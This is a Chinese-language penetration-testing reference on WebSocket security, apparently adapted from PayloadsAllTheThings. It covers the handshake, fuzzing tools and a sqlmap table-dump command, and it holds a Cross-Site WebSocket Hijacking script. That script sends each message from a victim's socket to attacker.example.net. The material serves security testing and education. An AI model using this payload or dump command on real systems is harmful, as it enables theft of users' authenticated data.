# Web Sockets - WebSocket安全

[SEARCH_KEYWORDS]
漏洞类型: Web Sockets WebSocket Security CSWSH Cross-Site WebSocket Hijacking
攻击类型: Data Exfiltration Injection CSWSH Man-in-the-Middle
关键词: websocket ws wss full-duplex real-time Socket.IO
技术: CSWSH Message Manipulation Handshake Manipulation Injection
协议: ws:// wss:// HTTP 101 Switching Protocols
头部: Upgrade Connection Sec-WebSocket-Key Sec-WebSocket-Version

[CONTENT]

## WebSocket概述

WebSocket是一种通信协议，通过单个长连接提供全双工通信通道。支持客户端和服务器之间的实时双向通信。

## WebSocket协议

### 握手请求

```http
GET /chat HTTP/1.1
Host: example.com:80
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```

### 握手响应

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

## 测试工具

### wsrepl

WebSocket REPL工具：

```ps1
pip install wsrepl
wsrepl -u URL -P auth_plugin.py
```

Python插件示例：

```py
from wsrepl import Plugin
from wsrepl.WSMessage import WSMessage
import json

class Demo(Plugin):
    def init(self):
        self.messages = [
            json.dumps({"auth": "session", "sessionId": "token"})
        ]

    async def on_message_sent(self, message: WSMessage) -> None:
        message.msg = json.dumps({"type": "message", "data": {"text": message.msg}})
```

### ws-harness.py

```powershell
python ws-harness.py -u "ws://dvws.local:8080/authenticate-user" -m ./message.txt
```

消息模板：

```json
{
    "auth_user":"dGVzda==",
    "auth_pass":"[FUZZ]"
}
```

配合sqlmap：

```python
sqlmap -u http://127.0.0.1:8000/?fuzz=test --tables --tamper=base64encode --dump
```

## Cross-Site WebSocket Hijacking (CSWSH)

如果WebSocket握手没有正确使用CSRF token或nonce保护，可以在攻击者控制的站点使用用户的认证WebSocket。

### 利用代码

```html
<script>
  ws = new WebSocket('wss://vulnerable.example.com/messages');
  ws.onopen = function start(event) {
    ws.send("HELLO");
  }
  ws.onmessage = function handleReply(event) {
    fetch('https://attacker.example.net/?'+event.data, {mode: 'no-cors'});
  }
  ws.send("Some text sent to the server");
</script>
```

## 工具

- wsrepl - WebSocket REPL测试工具
- ws-harness.py - WebSocket模糊测试
- websocket-turbo-intruder - Burp扩展
- socketsleuth - Burp WebSocket扩展

## 参考文档

原始来源: PayloadsAllTheThings/Web Sockets/README.md